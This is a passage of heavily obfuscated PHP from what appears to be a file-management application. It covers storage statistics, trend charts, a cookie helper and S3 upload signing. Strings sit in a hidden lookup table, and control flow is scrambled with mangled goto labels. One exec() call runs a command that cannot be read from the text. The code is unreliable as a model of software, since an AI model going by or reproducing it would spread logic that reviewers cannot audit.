$aΩÁ¶ΩÖòΩ)); goto Bà©ó€›øç; fµÏ’ˆêãú: $cö—ÍÀÿÚﬁ = Model($EÊÌŒëç•Ñ[820])->where($B ∂äËàÉΩ)->sum($EÊÌŒëç•Ñ[78]); $FÉóÖ•îÏÒ = array($EÊÌŒëç•Ñ[222] => $dõ‰´ÒËÃ…, $EÊÌŒëç•Ñ[751] => (int) $C¿®∑ù«º∑, $EÊÌŒëç•Ñ[1657] => (int) $CÜÕÓ√ôè, $EÊÌŒëç•Ñ[1658] => (int) $c‡Õ‡äÂÏ, $EÊÌŒëç•Ñ[1659] => (int) $cö—ÍÀÿÚﬁ); return $this->insert($FÉóÖ•îÏÒ); goto b‚–¡‹˘Ô∫; E¢ü§Œ¶—á: $B ∂äËàÉΩ[$EÊÌŒëç•Ñ[406]] = 1; $c‡Õ‡äÂÏ = Model($EÊÌŒëç•Ñ[820])->where($B ∂äËàÉΩ)->sum($EÊÌŒëç•Ñ[78]); $B ∂äËàÉΩ[$EÊÌŒëç•Ñ[406]] = 2; goto fµÏ’ˆêãú; Bà©ó€›øç: $CÜÕÓ√ôè = Model($EÊÌŒëç•Ñ[464])->where($B ∂äËàÉΩ)->sum($EÊÌŒëç•Ñ[78]); $B ∂äËàÉΩ[$EÊÌŒëç•Ñ[405]] = 0; $C¿®∑ù«º∑ = Model($EÊÌŒëç•Ñ[820])->where($B ∂äËàÉΩ)->sum($EÊÌŒëç•Ñ[78]); goto E¢ü§Œ¶—á; b‚–¡‹˘Ô∫: } public function trend($C—º´Èâ√‹, $FíøÑ˘ÈÌö) { goto e§≠ØÙ≠ﬂÒ; e›ô‰≤ïñÀ: if (empty($b›¨¯£âÃΩ)) { $eâ‹∫˜πüÔ = date($cö¢≥éÉªé[1660], strtotime($cö¢≥éÉªé[1661])); $eÙˆ´Ê‹õÕ = array($cö¢≥éÉªé[222] => $eâ‹∫˜πüÔ); foreach ($bÒ„û©É∑Œ[$C—º´Èâ√‹] as $FÉçßóÉœÌ => $còõØ´–üè) { $eÙˆ´Ê‹õÕ[$FÉçßóÉœÌ] = 0; } $b›¨¯£âÃΩ[] = $eÙˆ´Ê‹õÕ; } $cÈáÉøåÀá = array(); foreach ($b›¨¯£âÃΩ as $còõØ´–üè) { if ($C—º´Èâ√‹ == $cö¢≥éÉªé[1655] && $còõØ´–üè[$cö¢≥éÉªé[1657]] > $còõØ´–üè[$cö¢≥éÉªé[751]]) { $còõØ´–üè[$cö¢≥éÉªé[1657]] = $còõØ´–üè[$cö¢≥éÉªé[751]]; } foreach ($bÒ„û©É∑Œ[$C—º´Èâ√‹] as $FÉçßóÉœÌ => $b¶÷‘Ù—ØÇ) { $C±…ÊÒÓªê = array($cö¢≥éÉªé[222] => $còõØ´–üè[$cö¢≥éÉªé[222]], $cö¢≥éÉªé[1460] => $b¶÷‘Ù—ØÇ); $C±…ÊÒÓªê[$a®›«Ö©ã [$C—º´Èâ√‹]] = isset($còõØ´–üè[$FÉçßóÉœÌ]) ? $còõØ´–üè[$FÉçßóÉœÌ] : 0; $cÈáÉøåÀá[] = $C±…ÊÒÓªê; } } goto BµñÇ◊ß“à; E„€åóÇºá: if ($b›¨¯£âÃΩ && $FíøÑ˘ÈÌö != $cö¢≥éÉªé[1530]) { $eàúÀ°“å¨ = $b›¨¯£âÃΩ[0][$cö¢≥éÉªé[222]]; $Cÿº¢Ì©¶µ = $this->validDate($FíøÑ˘ÈÌö, $eàúÀ°“å¨); $b¢µ¨á◊©á = array(); $AÙ‹œŒ«åΩ = array_to_keyvalue($b›¨¯£âÃΩ, $cö¢≥éÉªé[222]); foreach ($Cÿº¢Ì©¶µ as $eâ‹∫˜πüÔ) { if (isset($AÙ‹œŒ«åΩ[$eâ‹∫˜πüÔ])) { $C±…ÊÒÓªê = $AÙ‹œŒ«åΩ[$eâ‹∫˜πüÔ]; } else { $C±…ÊÒÓªê = end($b›¨¯£âÃΩ); $C±…ÊÒÓªê[$cö¢≥éÉªé[222]] = $eâ‹∫˜πüÔ; if ($C—º´Èâ√‹ == $cö¢≥éÉªé[588]) { $C±…ÊÒÓªê[$cö¢≥éÉªé[1653]] = $C±…ÊÒÓªê[$cö¢≥éÉªé[1654]] = 0; } } $b¢µ¨á◊©á[] = $C±…ÊÒÓªê; } $b›¨¯£âÃΩ = $b¢µ¨á◊©á; } $bÒ„û©É∑Œ = array($cö¢≥éÉªé[588] => array($cö¢≥éÉªé[753] => LNG($cö¢≥éÉªé[1669]), $cö¢≥éÉªé[1653] => LNG($cö¢≥éÉªé[1670]), $cö¢≥éÉªé[1654] => LNG($cö¢≥éÉªé[1671])), $cö¢≥éÉªé[1655] => array($cö¢≥éÉªé[751] => LNG($cö¢≥éÉªé[1672]), $cö¢≥éÉªé[1657] => LNG($cö¢≥éÉªé[1673]), $cö¢≥éÉªé[1658] => LNG($cö¢≥éÉªé[1674]), $cö¢≥éÉªé[1659] => LNG($cö¢≥éÉªé[1675]))); $a®›«Ö©ã  = array($cö¢≥éÉªé[588] => $cö¢≥éÉªé[1676], $cö¢≥éÉªé[1655] => $cö¢≥éÉªé[78]); goto e›ô‰≤ïñÀ; BµñÇ◊ß“à: return $cÈáÉøåÀá; goto bÎ˜®È√ìµ; e§≠ØÙ≠ﬂÒ: $cö¢≥éÉªé =& $_SERVER[’ÿƒ†ïò]; if (!$this->init($C—º´Èâ√‹)) { return !1; } $b›¨¯£âÃΩ = $this->trendList($C—º´Èâ√‹); goto E„€åóÇºá; bÎ˜®È√ìµ: } public function validDate($Eìıø„ÿ™ç, $b®ò”ïèÙÛ) { goto eÓÕÖ¯ª˜ç; cï‹ÿÎ⁄ßß: switch ($Eìıø„ÿ™ç) { case $d—È≤ªÇÔ—[1537]: $B‰üØﬁ⁄éø = mktime(0, 0, 0, date($d—È≤ªÇÔ—[1677]), date($d—È≤ªÇÔ—[1281]) - date($d—È≤ªÇÔ—[1342]) + 7 - 7, date($d—È≤ªÇÔ—[1678])); $bëŸ⁄”ÀıÑ = 0; do { $d¯º…¨¶äô = date($d—È≤ªÇÔ—[1660], $B‰üØﬁ⁄éø - 3600 * 24 * 7 * $bëŸ⁄”ÀıÑ); $DÌ®î¶‚Öó[] = $d¯º…¨¶äô; $bëŸ⁄”ÀıÑ++; } while ($b®ò”ïèÙÛ < $d¯º…¨¶äô); break; case $d—È≤ªÇÔ—[1535]: $bëŸ⁄”ÀıÑ = 1; do { $A≤ü»Ç‰˘À = date($d—È≤ªÇÔ—[1679], strtotime("\x2d\40{$bëŸ⁄”ÀıÑ}\40\x6d\x6f\x6e\x74\150\163")); $DÌ®î¶‚Öó[] = $A≤ü»Ç‰˘À; $bëŸ⁄”ÀıÑ++; } while ($b®ò”ïèÙÛ < $A≤ü»Ç‰˘À); break; case $d—È≤ªÇÔ—[1680]: $AçπÊ˘∏óÌ = (int) date($d—È≤ªÇÔ—[1678], strtotime($b®ò”ïèÙÛ)); $eáÔﬂæëˆœ = (int) date($d—È≤ªÇÔ—[1678]); if ($AçπÊ˘∏óÌ >= $eáÔﬂæëˆœ) { break; } for ($AçπÊ˘∏óÌ; $AçπÊ˘∏óÌ < $eáÔﬂæëˆœ; $AçπÊ˘∏óÌ++) { $DÌ®î¶‚Öó[] = $AçπÊ˘∏óÌ . $d—È≤ªÇÔ—[1681]; } break; default: break; } if ($b®ò”ïèÙÛ > end($DÌ®î¶‚Öó)) { array_pop($DÌ®î¶‚Öó); } sort($DÌ®î¶‚Öó); goto A”ƒ¶Ëàæë; eÓÕÖ¯ª˜ç: $d—È≤ªÇÔ— =& $_SERVER[’ÿƒ†ïò]; $fä˜›◊‘êä = date($d—È≤ªÇÔ—[1660], strtotime($d—È≤ªÇÔ—[1661])); $DÌ®î¶‚Öó = array($fä˜›◊‘êä); goto cï‹ÿÎ⁄ßß; A”ƒ¶Ëàæë: return $DÌ®î¶‚Öó; goto bòÿÖÁ¯€ù; bòÿÖÁ¯€ù: } public function listTable($f¡ø∆Ì√≥) { $b∂äÎù‘˘Ï = ucfirst($f¡ø∆Ì√≥); return Model($b∂äÎù‘˘Ï)->listData(); } public function option($FÚ¶ƒ¨Õæ≥) { $FÚï¬‡€≥ú = $_SERVER[’ÿƒ†ïò][1682] . ucfirst($FÚ¶ƒ¨Õæ≥); return $this->{$FÚï¬‡€≥ú}(); } private function optionUser() { goto fËÃçÈΩºß; aÍ©∂’¬°’: if (!$CÉ§»ÌÜïÉ) { $CÉ§»ÌÜïÉ = 1; } $a¯¯É∑ü È = array($dËü¨„€”ø[1684] => array($dËü¨„€”ø[1001], $Fùﬂƒºƒ©«)); $B©ÇÍÉ”Ûä = Model($dËü¨„€”ø[532])->where($a¯¯É∑ü È)->count($dËü¨„€”ø[1557]); goto f ∂†⁄ƒ˜ÿ; f ∂†⁄ƒ˜ÿ: return array($dËü¨„€”ø[747] => (int) $e±Æâ≥£ÀÓ, $dËü¨„€”ø[1685] => (int) ($e±Æâ≥£ÀÓ - $B¨∆ÚÖﬂ∞Õ), $dËü¨„€”ø[1686] => (int) $B¨∆ÚÖﬂ∞Õ, $dËü¨„€”ø[1687] => (int) $B©ÇÍÉ”Ûä, $dËü¨„€”ø[1688] => $CÉ§»ÌÜïÉ); goto fªñÜ·ëπ; B¬˜◊„Õæé: $D∂πèÇ®’⁄ = intval($GLOBALS[$dËü¨„€”ø[6]][$dËü¨„€”ø[347]][$dËü¨„€”ø[1516]]) / 3600; $dÍ¥ï÷Û‰È = strtotime("\x2d{$D∂πèÇ®’⁄}\40\150\157\165\162\163"); $Fùﬂƒºƒ©« = strtotime(date($dËü¨„€”ø[1664])); goto dû≈¡Úçáƒ; fËÃçÈΩºß: $dËü¨„€”ø =& $_SERVER[’ÿƒ†ïò]; $e±Æâ≥£ÀÓ = Model($dËü¨„€”ø[532])->count($dËü¨„€”ø[1557]); $B¨∆ÚÖﬂ∞Õ = Model($dËü¨„€”ø[532])->where($dËü¨„€”ø[1683])->count($dËü¨„€”ø[1557]); goto B¬˜◊„Õæé; dû≈¡Úçáƒ: if ($dÍ¥ï÷Û‰È < $Fùﬂƒºƒ©«) { $dÍ¥ï÷Û‰È = $Fùﬂƒºƒ©«; } $a¯¯É∑ü È = array($dËü¨„€”ø[1684] => array($dËü¨„€”ø[1001], $dÍ¥ï÷Û‰È)); $CÉ§»ÌÜïÉ = (int) Model($dËü¨„€”ø[532])->where($a¯¯É∑ü È)->count($dËü¨„€”ø[1557]); goto aÍ©∂’¬°’; fªñÜ·ëπ: } private function optionFile() { goto bê∏Ø£öï’; bê∏Ø£öï’: $fÙ∑⁄ãÂÓÁ =& $_SERVER[’ÿƒ†ïò]; $Eù‡…›≤¨£ = $this->sourceSize(); $c≤Æ€™ÚÊ⁄ = $Eù‡…›≤¨£[$fÙ∑⁄ãÂÓÁ[78]]; goto F©ò£ãœ„»; F©ò£ãœ„»: $c·êˆﬂí‘ = $Eù‡…›≤¨£[$fÙ∑⁄ãÂÓÁ[1657]]; $cØÿåËßœ¨ = Model($fÙ∑⁄ãÂÓÁ[820])->where(array($fÙ∑⁄ãÂÓÁ[405] => 0))->count($fÙ∑⁄ãÂÓÁ[397]); $Bﬂ·”Îﬁ…˘ = array($fÙ∑⁄ãÂÓÁ[405] => 0, $fÙ∑⁄ãÂÓÁ[194] => array($fÙ∑⁄ãÂÓÁ[1001], strtotime(date($fÙ∑⁄ãÂÓÁ[1664])))); goto f®ÃîöåÂ´; f®ÃîöåÂ´: $cÈÔÓë¨Ãé = Model($fÙ∑⁄ãÂÓÁ[820])->where($Bﬂ·”Îﬁ…˘)->sum($fÙ∑⁄ãÂÓÁ[78]); $Aï…âÊæŒ  = Model($fÙ∑⁄ãÂÓÁ[820])->where($Bﬂ·”Îﬁ…˘)->count($fÙ∑⁄ãÂÓÁ[397]); return array($fÙ∑⁄ãÂÓÁ[751] => $c≤Æ€™ÚÊ⁄, $fÙ∑⁄ãÂÓÁ[1657] => $c·êˆﬂí‘, $fÙ∑⁄ãÂÓÁ[1689] => $c≤Æ€™ÚÊ⁄ - $c·êˆﬂí‘, $fÙ∑⁄ãÂÓÁ[1690] => (int) $cÈÔÓë¨Ãé, $fÙ∑⁄ãÂÓÁ[753] => (int) $cØÿåËßœ¨, $fÙ∑⁄ãÂÓÁ[1691] => (int) $Aï…âÊæŒ ); goto cüÓÒ∏±√Ø; cüÓÒ∏±√Ø: } private function optionAccess() { $E“ÊΩ¿ü†Ñ =& $_SERVER[’ÿƒ†ïò]; return array($E“ÊΩ¿ü†Ñ[747] => $this->typeLogCnt(), $E“ÊΩ¿ü†Ñ[107] => $this->typeLogCnt($E“ÊΩ¿ü†Ñ[107]), $E“ÊΩ¿ü†Ñ[444] => $this->typeLogCnt($E“ÊΩ¿ü†Ñ[444]), $E“ÊΩ¿ü†Ñ[1692] => $this->typeLogCnt($E“ÊΩ¿ü†Ñ[1692]), $E“ÊΩ¿ü†Ñ[1693] => $this->typeLogCnt($E“ÊΩ¿ü†Ñ[1693]), $E“ÊΩ¿ü†Ñ[588] => $this->typeLogCnt($E“ÊΩ¿ü†Ñ[33], $E“ÊΩ¿ü†Ñ[1668])); } private function typeLogCnt($Bú˜úÔ¨£◊ = '', $eº™ÜêÛãﬂ = "\x69\x64") { goto fëÆù—ä≤ò; fÇé˜‡Ü£„: $AúíÕëÃﬂ¢ = array($fç÷Ñœ°Òı[194] => array($fç÷Ñœ°Òı[1001], $Dóíﬂíî™ï)); if ($Bú˜úÔ¨£◊) { $AúíÕëÃﬂ¢[$fç÷Ñœ°Òı[29]] = array($fç÷Ñœ°Òı[7], $AÌ°Á∑ø≥Ü[$Bú˜úÔ¨£◊]); } $bèöÖÔ‹™Ã = Model($fç÷Ñœ°Òı[1667])->where($AúíÕëÃﬂ¢)->count($eº™ÜêÛãﬂ); goto fê¶©≈õò¶; fëÆù—ä≤ò: $fç÷Ñœ°Òı =& $_SERVER[’ÿƒ†ïò]; $AÌ°Á∑ø≥Ü = array($fç÷Ñœ°Òı[107] => array($fç÷Ñœ°Òı[1694], $fç÷Ñœ°Òı[1695]), $fç÷Ñœ°Òı[444] => array($fç÷Ñœ°Òı[1696], $fç÷Ñœ°Òı[1697]), $fç÷Ñœ°Òı[1692] => array($fç÷Ñœ°Òı[1698], $fç÷Ñœ°Òı[1699], $fç÷Ñœ°Òı[1700]), $fç÷Ñœ°Òı[1693] => array($fç÷Ñœ°Òı[1701], $fç÷Ñœ°Òı[1702]), $fç÷Ñœ°Òı[1703] => array($fç÷Ñœ°Òı[1704], $fç÷Ñœ°Òı[1705], $fç÷Ñœ°Òı[1706])); $Dóíﬂíî™ï = strtotime(date($fç÷Ñœ°Òı[1664])); goto fÇé˜‡Ü£„; fê¶©≈õò¶: return (int) $bèöÖÔ‹™Ã; goto cûâœπöƒå; cûâœπöƒå: } private function optionServer() { goto BπÃ”ﬁÉ∑; f°◊óÏùÖ€: $BØÙ›Ã∏òä = $EºÎäòñ∑£[0]; $C¢¢πÍê§ = $GLOBALS[$dëáâ◊å°—[6]][$dëáâ◊å°—[17]]; $e¬õÁì†¶è = $C¢¢πÍê§[$dëáâ◊å°—[962]]; goto A§•Œ∑´¢¡; A§•Œ∑´¢¡: if ($e¬õÁì†¶è == $dëáâ◊å°—[785]) { $F€‚⁄®ÇÈà = explode($dëáâ◊å°—[1195], $C¢¢πÍê§[$dëáâ◊å°—[961]]); $e¬õÁì†¶è = $F€‚⁄®ÇÈà[0]; } if ($e¬õÁì†¶è == $dëáâ◊å°—[788] || $e¬õÁì†¶è == $dëáâ◊å°—[789]) { $Dﬂ˜™ßÁê§ = Model()->db()->query($dëáâ◊å°—[1707]); $Fä…øÎå’¬ = $Dﬂ˜™ßÁê§[0] && isset($Dﬂ˜™ßÁê§[0][$dëáâ◊å°—[1459]]) ? $Dﬂ˜™ßÁê§[0][$dëáâ◊å°—[1459]] : 0; $e¬õÁì†¶è = $dëáâ◊å°—[1708] . ($Fä…øÎå’¬ ? $dëáâ◊å°—[8] . $Fä…øÎå’¬ : $dëáâ◊å°—[33]); } $E∫í‹ﬁÇœ© = $GLOBALS[$dëáâ◊å°—[6]][$dëáâ◊å°—[347]][$dëáâ◊å°—[822]]; goto câà–…æÔË; BπÃ”ﬁÉ∑: $dëáâ◊å°— =& $_SERVER[’ÿƒ†ïò]; $e√Í∞ÏƒÛ◊ = $this->diskDriver(); $AûêôÀáÉ„ = KodIO::defaultDriver(); goto cêÜ√◊óπ¢; cêÜ√◊óπ¢: $E¡ÆÊ¬πúå = array($dëáâ◊å°—[812] => $AûêôÀáÉ„[$dëáâ◊å°—[395]]); $fóŸ≤‘ê±“ = Model($dëáâ◊å°—[464])->where($E¡ÆÊ¬πúå)->sum($dëáâ◊å°—[78]); $EºÎäòñ∑£ = explode($dëáâ◊å°—[50], $_SERVER[$dëáâ◊å°—[142]]); goto f°◊óÏùÖ€; câà–…æÔË: return array($dëáâ◊å°—[1709] => $e√Í∞ÏƒÛ◊ ? $e√Í∞ÏƒÛ◊[$dëáâ◊å°—[1710]] : 0, $dëáâ◊å°—[1711] => $e√Í∞ÏƒÛ◊ ? $e√Í∞ÏƒÛ◊[$dëáâ◊å°—[1712]] : 0, $dëáâ◊å°—[1713] => (int) $AûêôÀáÉ„[$dëáâ◊å°—[1710]] * 1024 * 1024 * 1024, $dëáâ◊å°—[1714] => (int) $fóŸ≤‘ê±“, $dëáâ◊å°—[1715] => ucfirst($BØÙ›Ã∏òä), $dëáâ◊å°—[1716] => $dëáâ◊å°—[1717] . PHP_VERSION, $dëáâ◊å°—[1718] => phpBuild64() ? 64 : 32, $dëáâ◊å°—[746] => str_replace($dëáâ◊å°—[1719], $dëáâ◊å°—[978], $e¬õÁì†¶è), $dëáâ◊å°—[347] => ucfirst($E∫í‹ﬁÇœ©), $dëáâ◊å°—[28] => $_SERVER[$dëáâ◊å°—[1720]]); goto EãÁπ∞¿‰´; EãÁπ∞¿‰´: } private function diskDriver() { goto bä≥íç“Üæ; a‚™æÇç‹’: $d¨ŸÕûªôú = $AÏ—á¡ëôè - @disk_free_space($A∫¡ÆÆØ∞è); return array($c∑Ø†®∆™ï[1710] => $AÏ—á¡ëôè, $c∑Ø†®∆™ï[1712] => $d¨ŸÕûªôú); goto EÜ–ú˘≤§ö; bä≥íç“Üæ: $c∑Ø†®∆™ï =& $_SERVER[’ÿƒ†ïò]; $A∫¡ÆÆØ∞è = $c∑Ø†®∆™ï[8]; $FØë¡Ã≠º„ = $GLOBALS[$c∑Ø†®∆™ï[6]][$c∑Ø†®∆™ï[1721]] == $c∑Ø†®∆™ï[1722]; goto F≠•êß…ã∏; F≠•êß…ã∏: if ($FØë¡Ã≠º„) { $A∫¡ÆÆØ∞è = $c∑Ø†®∆™ï[1723]; if (function_exists($c∑Ø†®∆™ï[1724])) { exec($c∑Ø†®∆™ï[1725], $c∂–‚¡÷˜•); $A∫¡ÆÆØ∞è = $c∂–‚¡÷˜•[1] . $c∑Ø†®∆™ï[8]; } } if (!file_exists($A∫¡ÆÆØ∞è)) { return; } $AÏ—á¡ëôè = @disk_total_space($A∫¡ÆÆØ∞è); goto a‚™æÇç‹’; EÜ–ú˘≤§ö: } public function fileChart($Eóµ¨ÇÇ≥Â) { goto dÑ¶è¬⁄Òœ; DùïÛ≥§éñ: $cîâë∞ëØê = $this->sourceSize(); $fÜä‡„∞£† = array($F˜˜–‰îï‡[492] => 0, $F˜˜–‰îï‡[406] => 1); $DÚˆà›Ö‘· = Model($F˜˜–‰îï‡[820])->where($fÜä‡„∞£†)->sum($F˜˜–‰îï‡[78]); goto d§Ãﬁ‰ßÌµ; d§Ãﬁ‰ßÌµ: $fÜä‡„∞£†[$F˜˜–‰îï‡[406]] = 2; $aòóÍ≥ÂÊ∏ = Model($F˜˜–‰îï‡[820])->where($fÜä‡„∞£†)->sum($F˜˜–‰îï‡[78]); return array($F˜˜–‰îï‡[751] => $cîâë∞ëØê[$F˜˜–‰îï‡[78]], $F˜˜–‰îï‡[1657] => $cîâë∞ëØê[$F˜˜–‰îï‡[1657]], $F˜˜–‰îï‡[1658] => (int) $DÚˆà›Ö‘·, $F˜˜–‰îï‡[1659] => (int) $aòóÍ≥ÂÊ∏); goto F•êÈºûµ¿; dÑ¶è¬⁄Òœ: $F˜˜–‰îï‡ =& $_SERVER[’ÿƒ†ïò]; if (isset($Eóµ¨ÇÇ≥Â[$F˜˜–‰îï‡[1557]])) { return Model($F˜˜–‰îï‡[820])->userFileTypeProfile($Eóµ¨ÇÇ≥Â[$F˜˜–‰îï‡[1557]]); } if (isset($Eóµ¨ÇÇ≥Â[$F˜˜–‰îï‡[1726]])) { return Model($F˜˜–‰îï‡[820])->groupFileTypeProfile($Eóµ¨ÇÇ≥Â[$F˜˜–‰îï‡[1726]]); } goto DùïÛ≥§éñ; F•êÈºûµ¿: } private function sourceSize() { $c⁄Çáç≈èˆ =& $_SERVER[’ÿƒ†ïò]; $b·∆ø∞òÂ = Model($c⁄Çáç≈èˆ[820])->where(array($c⁄Çáç≈èˆ[405] => 0))->sum($c⁄Çáç≈èˆ[78]); $dŒ‰∞‚∫Ω· = Model($c⁄Çáç≈èˆ[464])->sum($c⁄Çáç≈èˆ[78]); if ($dŒ‰∞‚∫Ω· > $b·∆ø∞òÂ) { $dŒ‰∞‚∫Ω· = $b·∆ø∞òÂ; } return array($c⁄Çáç≈èˆ[78] => (int) $b·∆ø∞òÂ, $c⁄Çáç≈èˆ[1657] => (int) $dŒ‰∞‚∫Ω·); } } goto b∂∑ﬁ’∂Üª; Dçœ–ŸÆ≥Í: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($e¨Çº»«‘“ = '', $C¬œÃ—Éµó = 0) { if (is_string($e¨Çº»«‘“) && $e¨Çº»«‘“ != $_SERVER[’ÿƒ†ïò][33]) { $this->prefix = $e¨Çº»«‘“; } if (is_numeric($C¬œÃ—Éµó) && $C¬œÃ—Éµó > 0) { $this->expire = $C¬œÃ—Éµó; } } public static function getInstance() { static $bç”¶Á§Í¬; if ($bç”¶Á§Í¬ === null) { $bç”¶Á§Í¬ = new self(); } return $bç”¶Á§Í¬; } private static $cookieDisable = false; public static function disable($dÑ ¿ÈÏ˜≈) { self::$cookieDisable = $dÑ ¿ÈÏ˜≈; } private static $sameCookieSet = array(); public static function set($AªŒØ¶≤ªΩ, $f——ñèÕÉî, $a®óÓºæÁæ = 0, $Aãßçﬁ‡ä« = false, $CßéÈß∫™Ñ = false) { goto CÉ”≠≤√Ω≤; CÉ”≠≤√Ω≤: $Aú‘⁄÷†òõ =& $_SERVER[’ÿƒ†ïò]; if (self::$cookieDisable) { return; } if (!$a®óÓºæÁæ) { $a®óÓºæÁæ = 24 * 3600 * 7; } goto a‡∑Ï⁄Á»Ü; a‡∑Ï⁄Á»Ü: if (isset(self::$sameCookieSet[$AªŒØ¶≤ªΩ]) && self::$sameCookieSet[$AªŒØ¶≤ªΩ] == $f——ñèÕÉî . $a®óÓºæÁæ) { return; } self::$sameCookieSet[$AªŒØ¶≤ªΩ] = $f——ñèÕÉî . $a®óÓºæÁæ; if (!$CßéÈß∫™Ñ) { $CßéÈß∫™Ñ = str_replace(HOST, $Aú‘⁄÷†òõ[33], APP_HOST); $CßéÈß∫™Ñ = _get($GLOBALS, $Aú‘⁄÷†òõ[873], $CßéÈß∫™Ñ); } goto fÓå§¢¿ê’; fÓå§¢¿ê’: $BÏÿ¿¬íÓ∞ = $Aú‘⁄÷†òõ[33]; setcookie($AªŒØ¶≤ªΩ, $f——ñèÕÉî, time() + $a®óÓºæÁæ, $Aú‘⁄÷†òõ[8] . trim($CßéÈß∫™Ñ, $Aú‘⁄÷†òõ[8]) . $BÏÿ¿¬íÓ∞, !1, !1, $Aãßçﬁ‡ä«); goto bÇŒ„Ë·¢ê; bÇŒ„Ë·¢ê: } public static function setSafe($eö∆€‚ÖÙ⁄, $bŒó∏ÙÌéö, $D©àú¥¬°Ò = 0) { self::set($eö∆€‚ÖÙ⁄, $bŒó∏ÙÌéö, $D©àú¥¬°Ò, !0); } public static function get($DÛ¢·Ó°åê) { return isset($_COOKIE[$DÛ¢·Ó°åê]) ? $_COOKIE[$DÛ¢·Ó°åê] : !1; } public static function remove($Bâ›ë˘º¬¿, $CçªòÊ¥ı› = false) { unset($_COOKIE[$Bâ›ë˘º¬¿]); self::set($Bâ›ë˘º¬¿, $_SERVER[’ÿƒ†ïò][33], 1, $CçªòÊ¥ı›); } } $E‘‰íçå π = $_SERVER[$_SERVER[’ÿƒ†ïò][861]]; $Fÿç’ŸÈ∏Ï = $_SERVER[’ÿƒ†ïò][874]; goto B¢ø¨πì”Â; d”¡ﬁ≠©‚©: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($fàÍæÀñúä) { parent::__construct($fàÍæÀñúä); } public function uploadFormData($FíﬁÇÿ·Ø·, $AãÕ˘≥å©ñ = 3600) { goto f’ﬂ”Ñ‡·Ì; AüÈÎ¿óΩà: $B“éô•√ÜÆ = $eÓã¢»∏œ[1254]; $eõ»õà ±Â = $AãÕ˘≥å©ñ . $eÓã¢»∏œ[33]; $Eßí’âîùÕ = $eÓã¢»∏œ[1217]; goto Dﬂπ≠ŸûÒû; cÖÁáÕ§≥Æ: $AÚìñπèüÉ = array($eÓã¢»∏œ[211] => $eÓã¢»∏œ[33], $eÓã¢»∏œ[1264] => $eÓã¢»∏œ[33], $eÓã¢»∏œ[1221] => $CôÑé≤∏Éà, $eÓã¢»∏œ[1225] => $Eßí’âîùÕ, $eÓã¢»∏œ[1229] => $FàﬁàÑÜ·Í, $eÓã¢»∏œ[1265] => $A›øÑ¥§ê∏, $eÓã¢»∏œ[1266] => $C‘Ø‹˘¶ãã, $eÓã¢»∏œ[1267] => $aÆµ•„åﬂö, $eÓã¢»∏œ[1268] => $eõ»õà ±Â, $eÓã¢»∏œ[1269] => $fÀûæø±√Ÿ, $eÓã¢»∏œ[175] => $this->getHost()); return $AÚìñπèüÉ; goto EÈﬂŸÔ›É∑; A÷êà∑˜á«: $Aü±™ª∫ıÿ = $eÓã¢»∏œ[59]; $aÆµ•„åﬂö = gmdate($eÓã¢»∏œ[1253]); $fä⁄∫®â√ƒ = gmdate($eÓã¢»∏œ[739]); goto AüÈÎ¿óΩà; f’ﬂ”Ñ‡·Ì: $eÓã¢»∏œ =& $_SERVER[’ÿƒ†ïò]; $CôÑé≤∏Éà = $eÓã¢»∏œ[192]; $C‘Ø‹˘¶ãã = $eÓã¢»∏œ[1252]; goto A÷êà∑˜á«; Dﬂπ≠ŸûÒû: $fÎ¥ÔÚÉ±Û = array($this->accessKey, $fä⁄∫®â√ƒ, $this->region, $Aü±™ª∫ıÿ, $B“éô•√ÜÆ); $A›øÑ¥§ê∏ = implode($eÓã¢»∏œ[8], $fÎ¥ÔÚÉ±Û); $Eó‚Î≠›©‹ = array($eÓã¢»∏œ[1219] => gmdate($eÓã¢»∏œ[1218], strtotime($eÓã¢»∏œ[1255])), $eÓã¢»∏œ[1220] => array(array($eÓã¢»∏œ[1222] => $this->bucket), array($eÓã¢»∏œ[1221] => $CôÑé≤∏Éà), array($eÓã¢»∏œ[1223], $eÓã¢»∏œ[1224], $eÓã¢»∏œ[33]), array($eÓã¢»∏œ[1223], $eÓã¢»∏œ[1256], $eÓã¢»∏œ[33]), array($eÓã¢»∏œ[1223], $eÓã¢»∏œ[1257], $eÓã¢»∏œ[33]), array($eÓã¢»∏œ[1225] => $Eßí’âîùÕ), array($eÓã¢»∏œ[1258] => $A›øÑ¥§ê∏), array($eÓã¢»∏œ[1259] => $C‘Ø‹˘¶ãã), array($eÓã¢»∏œ[1260] => $aÆµ•„åﬂö), array($eÓã¢»∏œ[1261] => $eõ»õà ±Â))); goto B†Ô‡‚¶ú; B†Ô‡‚¶ú: $FàﬁàÑÜ·Í = base64_encode(json_encode($Eó‚Î≠›©‹)); $Cãﬁ•ßÊ†¨ = hash_hmac($eÓã¢»∏œ[1262], $fä⁄∫®â√ƒ, $eÓã¢»∏œ[1263] . $this->secret, !0); $BÑıÃçå¿∂ = hash_hmac($eÓã¢»∏œ[1262], $this->region, $Cãﬁ•ßÊ†¨, !0); goto FÍÔ‹â≥ë≥; FÍÔ‹â≥ë≥: $Fì‰µÿŸÙ† = hash_hmac($eÓã¢»∏œ[1262], $Aü±™ª∫ıÿ, $BÑıÃçå¿∂, !0); $EﬂæÃúÁ¡® = hash_hmac($eÓã¢»∏œ[1262], $B“éô•√ÜÆ, $Fì‰µÿŸÙ†, !0); $fÀûæø±√Ÿ = hash_hmac($eÓã¢»∏œ[1262], $FàﬁàÑÜ·Í, $EﬂæÃúÁ¡®); goto cÖÁáÕ§≥Æ; EÈﬂŸÔ›É∑: } public function multiUploadFormData($D¡£¨úˆÕ≤, $dπÃ∫è®˘ı = 3600) { $AÇâÑΩë£À =& $_SERVER[’ÿƒ†ïò]; $Aè‰•œˆÆÇ = gmdate($AÇâÑΩë£À[1346]); $eÊÛå–ªË∞ = array(); $f∏ëá´ÜŸå = $this->client->getUploadId($this->bucket, $D¡£¨úˆÕ≤, $eÊÛå–ªË∞); if (!$f∏ëá´ÜŸå) { return !1; } return array($AÇâÑΩë£À[221] => $f∏ëá´ÜŸå, $AÇâÑΩë£À[175] => $this->getHost() . $AÇâÑΩë£À[8] . $this->pathEncode($D¡£¨úˆÕ≤), $AÇâÑΩë£À[222] => $Aè‰•œˆÆÇ, $AÇâÑΩë£À[93] => $D¡£¨úˆÕ≤); } public function multiUploadAuthData($fú˜∑Öù¡ƒ, $b‘ü÷˜¡ßø = array()) { goto cÁœÆÑä•ã; cÁœÆÑä•ã: $a÷©ÓêÁ‚â =& $_SERVER[’ÿƒ†ïò]; $eú«‹€™¶Ÿ = 